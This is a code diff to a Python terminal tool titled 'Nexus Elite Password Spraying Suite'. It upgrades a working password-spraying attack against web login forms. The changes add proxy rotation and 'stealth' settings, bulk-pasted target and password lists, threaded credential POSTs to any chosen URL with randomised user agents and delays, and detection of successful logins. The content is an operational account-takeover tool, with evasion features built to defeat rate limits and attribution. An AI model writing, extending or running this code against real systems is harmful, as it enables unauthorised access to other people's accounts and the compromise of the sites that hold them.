@@ -48,7 +48,7 @@ def show_banner():
 ██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
 ██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
 ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
-{Colors.PURPLE}Universal Password Spraying Suite v7.0{Colors.END}
+{Colors.PURPLE}Nexus Elite Password Spraying Suite v8.0{Colors.END}
 {Colors.DIM}--------------------------------------------------{Colors.END}
     """
     print(banner)
@@ -57,10 +57,10 @@ def main_menu():
     clear_screen()
     show_banner()
     print(f"{Colors.YELLOW}[ Main Menu ]{Colors.END}")
-    print(f"{Colors.GREEN}[1]{Colors.END} Run Security Scan")
-    print(f"{Colors.GREEN}[2]{Colors.END} Target Configuration")
+    print(f"{Colors.GREEN}[1]{Colors.END} Run Elite Security Scan")
+    print(f"{Colors.GREEN}[2]{Colors.END} Target & Bulk Configuration")
     print(f"{Colors.GREEN}[3]{Colors.END} Server & Field Settings")
-    print(f"{Colors.GREEN}[4]{Colors.END} Advanced Settings")
+    print(f"{Colors.GREEN}[4]{Colors.END} Stealth & Proxy Settings")
     print(f"{Colors.RED}[0]{Colors.END} Exit")
     
     choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus > {Colors.END}")
@@ -71,27 +71,32 @@ def spray_task(target, password, url, config, results):
     if config['advanced_settings']['random_user_agents']:
         headers['User-Agent'] = random.choice(USER_AGENTS)
     
+    proxies = None
+    if config['advanced_settings']['proxy_enabled'] and config['advanced_settings']['proxies']:
+        p = random.choice(config['advanced_settings']['proxies'])
+        proxies = {"http": p, "https": p}
+    
     try:
         # Smart Delay
         delay = random.uniform(config['advanced_settings']['smart_delay'][0], config['advanced_settings']['smart_delay'][1])
         time.sleep(delay)
         
-        # Build Dynamic Payload
         user_field = config['server_settings'].get('user_field', 'username')
         pass_field = config['server_settings'].get('pass_field', 'password')
         path = config['server_settings'].get('login_path', '/login')
-        
-        payload = {user_field: target, pass_field: password}
         full_url = url.rstrip('/') + path
         
-        # Support both JSON and Form Data (Form data is common in real sites)
-        response = requests.post(full_url, data=payload, headers=headers, timeout=config['server_settings']['timeout'])
+        payload = {user_field: target, pass_field: password}
         
-        # Detection logic (can be customized)
-        # For testphp.vulnweb.com, it redirects on success or shows specific text
-        if response.status_code == 200 and ("logout" in response.text.lower() or "success" in response.text.lower()):
-            msg = f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Found: {target} -> {password}{Colors.END}"
-            print(msg)
+        # Real HTTP Request with optional Proxy
+        response = requests.post(full_url, data=payload, headers=headers, proxies=proxies, timeout=config['server_settings']['timeout'], allow_redirects=True)
+        
+        # Success Detection Logic
+        success_indicators = ["logout", "success", "welcome", "dashboard", "account"]
+        is_success = any(ind in response.text.lower() for ind in success_indicators) or response.status_code == 302
+        
+        if is_success:
+            print(f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Found: {target} -> {password}{Colors.END}")
             results.append({"target": target, "password": password, "time": datetime.now().strftime("%H:%M:%S")})
             return True
         elif config['scan_settings']['verbose']:
@@ -99,7 +104,7 @@ def spray_task(target, password, url, config, results):
             sys.stdout.flush()
     except Exception as e:
         if config['scan_settings']['verbose']:
-            print(f"\n{Colors.RED}[!] Error on {target}: {str(e)[:50]}{Colors.END}")
+            sys.stdout.write(f"{Colors.RED}[!] Error on {target}: {str(e)[:40]}{Colors.END}\n")
     return False
 
 def run_high_efficiency_scan():
@@ -118,11 +123,10 @@ def run_high_efficiency_scan():
         return
 
     print(f"{Colors.YELLOW}Target URL: {Colors.CYAN}{url}{config['server_settings'].get('login_path', '')}{Colors.END}")
-    print(f"{Colors.YELLOW}Fields: {Colors.CYAN}{config['server_settings'].get('user_field')} / {config['server_settings'].get('pass_field')}{Colors.END}")
-    print(f"{Colors.YELLOW}Initiating Universal Spray...{Colors.END}\n")
+    print(f"{Colors.YELLOW}Stealth: {Colors.CYAN}{'ON' if config['advanced_settings']['proxy_enabled'] else 'OFF'}{Colors.END} | Threads: {Colors.CYAN}{threads}{Colors.END}")
+    print(f"{Colors.YELLOW}Initiating Elite Spray Attack...{Colors.END}\n")
 
     found_results = []
-    
     with ThreadPoolExecutor(max_workers=threads) as executor:
         for pwd in passwords:
             print(f"{Colors.BLUE}{Colors.BOLD}[*] Spraying password: {pwd}{Colors.END}")
@@ -133,7 +137,6 @@ def run_high_efficiency_scan():
     print(f"Total Found: {Colors.GREEN}{len(found_results)}{Colors.END}")
     for res in found_results:
         print(f" - {res['target']} : {res['password']} (@{res['time']})")
-    
     input(f"\n{Colors.BOLD}Press Enter to return...{Colors.END}")
 
 def target_config():
@@ -141,24 +144,31 @@ def target_config():
         config = load_config()
         clear_screen()
         show_banner()
-        print(f"{Colors.YELLOW}[ Target Configuration ]{Colors.END}")
-        print(f"{Colors.GREEN}[1]{Colors.END} Manage Emails/Usernames")
-        print(f"{Colors.GREEN}[2]{Colors.END} Manage Passwords")
+        print(f"{Colors.YELLOW}[ Target & Bulk Configuration ]{Colors.END}")
+        print(f"{Colors.GREEN}[1]{Colors.END} Bulk Add Usernames/Emails (Paste List)")
+        print(f"{Colors.GREEN}[2]{Colors.END} Bulk Add Passwords (Paste List)")
+        print(f"{Colors.GREEN}[3]{Colors.END} View Current Lists")
         print(f"{Colors.RED}[0]{Colors.END} Back")
         
         choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Targets > {Colors.END}")
         if choice == '1':
-            print(f"\nCurrent List: {config['targets']['emails']}")
-            new = input("Add new (or 'clear'): ")
-            if new == 'clear': config['targets']['emails'] = []
-            elif new: config['targets']['emails'].append(new)
+            print(f"\n{Colors.WHITE}Paste your list below (one per line, press Enter then Ctrl+D to save):{Colors.END}")
+            data = sys.stdin.read().splitlines()
+            config['targets']['emails'] = [x.strip() for x in data if x.strip()]
             save_config(config)
+            print(f"{Colors.GREEN}[✓] Added {len(config['targets']['emails'])} targets.{Colors.END}")
+            time.sleep(1)
         elif choice == '2':
-            print(f"\nCurrent Passwords: {config['passwords_to_test']}")
-            new = input("Add new (or 'clear'): ")
-            if new == 'clear': config['passwords_to_test'] = []
-            elif new: config['passwords_to_test'].append(new)
+            print(f"\n{Colors.WHITE}Paste your list below (one per line, press Enter then Ctrl+D to save):{Colors.END}")
+            data = sys.stdin.read().splitlines()
+            config['passwords_to_test'] = [x.strip() for x in data if x.strip()]
             save_config(config)
+            print(f"{Colors.GREEN}[✓] Added {len(config['passwords_to_test'])} passwords.{Colors.END}")
+            time.sleep(1)
+        elif choice == '3':
+            print(f"\nTargets: {config['targets']['emails']}")
+            print(f"Passwords: {config['passwords_to_test']}")
+            input("\nPress Enter...")
         elif choice == '0':
             break
 
@@ -172,41 +182,48 @@ def server_config():
         print(f"2. Path: {Colors.CYAN}{config['server_settings'].get('login_path')}{Colors.END}")
         print(f"3. User Field: {Colors.CYAN}{config['server_settings'].get('user_field')}{Colors.END}")
         print(f"4. Pass Field: {Colors.CYAN}{config['server_settings'].get('pass_field')}{Colors.END}")
-        print(f"5. Switch Mode (Current: {config['server_settings']['mode'].upper()})")
         print(f"0. Back")
         
         choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Server > {Colors.END}")
         if choice == '1':
-            config['server_settings']['custom_url'] = input("Enter Base URL (e.g. http://site.com): ")
+            config['server_settings']['custom_url'] = input("Base URL: ")
             config['server_settings']['mode'] = "custom"
         elif choice == '2':
-            config['server_settings']['login_path'] = input("Enter Login Path (e.g. /login.php): ")
+            config['server_settings']['login_path'] = input("Path: ")
         elif choice == '3':
-            config['server_settings']['user_field'] = input("Enter User Field Name: ")
+            config['server_settings']['user_field'] = input("User Field: ")
         elif choice == '4':
-            config['server_settings']['pass_field'] = input("Enter Pass Field Name: ")
-        elif choice == '5':
-            config['server_settings']['mode'] = "local" if config['server_settings']['mode'] == "custom" else "custom"
+            config['server_settings']['pass_field'] = input("Pass Field: ")
         elif choice == '0':
             break
         save_config(config)
 
-def advanced_config():
+def stealth_config():
     while True:
         config = load_config()
         clear_screen()
         show_banner()
-        print(f"{Colors.YELLOW}[ Advanced Settings ]{Colors.END}")
-        print(f"1. Threads: {Colors.CYAN}{config['advanced_settings']['threads']}{Colors.END}")
-        print(f"2. Random User-Agents: {Colors.CYAN}{config['advanced_settings']['random_user_agents']}{Colors.END}")
+        print(f"{Colors.YELLOW}[ Stealth & Proxy Settings ]{Colors.END}")
+        print(f"1. Proxy Enabled: {Colors.CYAN}{config['advanced_settings']['proxy_enabled']}{Colors.END}")
+        print(f"2. Add Proxies (Paste List)")
+        print(f"3. Random User-Agents: {Colors.CYAN}{config['advanced_settings']['random_user_agents']}{Colors.END}")
+        print(f"4. Threads: {Colors.CYAN}{config['advanced_settings']['threads']}{Colors.END}")
         print(f"0. Back")
         
-        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Advanced > {Colors.END}")
+        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Stealth > {Colors.END}")
         if choice == '1':
+            config['advanced_settings']['proxy_enabled'] = not config['advanced_settings']['proxy_enabled']
+        elif choice == '2':
+            print(f"\n{Colors.WHITE}Paste proxies (e.g. 1.2.3.4:8080) (Enter then Ctrl+D):{Colors.END}")
+            data = sys.stdin.read().splitlines()
+            config['advanced_settings']['proxies'] = [x.strip() for x in data if x.strip()]
+            print(f"{Colors.GREEN}[✓] Added {len(config['advanced_settings']['proxies'])} proxies.{Colors.END}")
+            time.sleep(1)
+        elif choice == '3':
+            config['advanced_settings']['random_user_agents'] = not config['advanced_settings']['random_user_agents']
+        elif choice == '4':
             try: config['advanced_settings']['threads'] = int(input("Threads: "))
             except: pass
-        elif choice == '2':
-            config['advanced_settings']['random_user_agents'] = not config['advanced_settings']['random_user_agents']
         elif choice == '0':
             break
         save_config(config)
@@ -221,7 +238,7 @@ def start():
         elif choice == '3':
             server_config()
         elif choice == '4':
-            advanced_config()
+            stealth_config()
         elif choice == '0':
             sys.exit()
 
